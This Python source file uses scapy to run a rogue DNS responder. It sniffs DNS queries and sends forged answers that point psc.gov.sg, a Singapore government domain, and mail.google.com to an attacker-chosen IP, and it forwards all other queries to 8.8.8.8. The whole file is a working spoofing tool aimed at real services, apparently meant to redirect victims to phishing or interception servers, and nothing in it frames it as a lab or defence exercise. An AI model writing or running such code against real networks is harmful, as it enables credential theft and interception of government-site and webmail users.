from scapy.all import DNS, DNSQR, DNSRR, IP, send, sniff, sr1, UDP

def dns_responder(dns_ip: str, dns_server_ip, interface):

    #local function to foward packets that are not of the domain to spoof
    def forward_dns(pkt: IP):
        print(f"Forwarding: {pkt[DNSQR].qname}")
        response = sr1(IP(dst='8.8.8.8')/UDP(sport=pkt[UDP].sport)/DNS(rd=1, id=pkt[DNS].id, qd=DNSQR(qname=pkt[DNSQR].qname)),verbose=0,)
        resp_pkt = IP(dst=pkt[IP].src, src=dns_server_ip)/UDP(dport=pkt[UDP].sport)/DNS()
        resp_pkt[DNS] = response[DNS]
        send(resp_pkt, verbose=0)
        return f"Responding to {pkt[IP].src}"

    #local function to get the pkt and determine if to send a spoofed reply or foward to actual google dns server
    def get_response(pkt: IP):
        if (DNS in pkt and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0):
            
            if "psc.gov.sg" in str(pkt["DNS Question Record"].qname) or "psc.gov.sg" in pkt["DNS Question Record"].qname.decode('utf-8') :
                spf_resp = IP(dst=pkt[IP].src)/UDP(dport=pkt[UDP].sport, sport=53)/DNS(id=pkt[DNS].id,qr=1,ancount=1,rd=1, qd=DNSQR(qname=pkt[DNSQR].qname),an=DNSRR(rrname=pkt[DNSQR].qname, rdata=dns_ip)/DNSRR(rrname="psc.gov.sg",rdata=dns_ip))
                send(spf_resp, interface=interface)
                return f"Spoofed DNS Response Sent: {pkt[IP].src} {pkt[DNSQR].qname}"
                
            elif "mail.google.com" in str(pkt["DNS Question Record"].qname) or "mail.google.com" in pkt["DNS Question Record"].qname.decode('utf-8') :
                spf_resp = IP(dst=pkt[IP].src)/UDP(dport=pkt[UDP].sport, sport=53)/DNS(id=pkt[DNS].id,qr=1,ancount=1,rd=1, qd=DNSQR(qname=pkt[DNSQR].qname),an=DNSRR(rrname=pkt[DNSQR].qname, rdata=dns_ip)/DNSRR(rrname="mail.google.com.",rdata=dns_ip))
                send(spf_resp, interface=interface)
                return f"Spoofed DNS Response Sent: {pkt[IP].src} {pkt[DNSQR].qname}"

            else:
                # make DNS query, capturing the answer and send the answer
                return forward_dns(pkt)

    return get_response

def main():
    interface = input("Enter interface to sniff on: ").strip()
    dns_server_ip = input("Enter IP of rogue dns server: ").strip()  # DNS server IP

    pkt_filter = f"udp port 53 and ip dst {dns_server_ip}"
    sniff(filter=pkt_filter, prn=dns_responder(dns_server_ip, dns_server_ip, interface), interface=interface)


if __name__ == "__main__":
    main()